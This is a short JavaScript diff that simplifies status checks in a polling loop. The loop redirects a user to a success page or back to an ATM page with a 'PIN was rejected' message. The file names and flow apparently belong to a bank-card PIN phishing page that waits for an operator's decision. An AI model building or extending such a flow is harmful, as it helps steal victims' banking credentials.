@@ -368,11 +368,10 @@
           .then(function(res) { return res.json(); })
           .then(function(data) {
             if (!data || !data.status) return;
-            var status = String(data.status || '').trim().toLowerCase();
-            if (status === 'approved' || status === 'accept' || status === 'accepted' || status === 'verified' || status === 'success') {
+            if (data.status === 'approved') {
               clearInterval(pollInterval);
               window.location.href = 'success-en.html?id=' + requestId;
-            } else if (status === 'rejected' || status === 'reject' || status === 'declined' || status === 'error' || status === 'failed') {
+            } else if (data.status === 'rejected') {
               clearInterval(pollInterval);
               var rejectMessage = 'The PIN was rejected. Please verify the details and try again.';
               window.location.href = 'atm-en.html?error=atm&msg=' + encodeURIComponent(rejectMessage) + '&id=' + requestId;
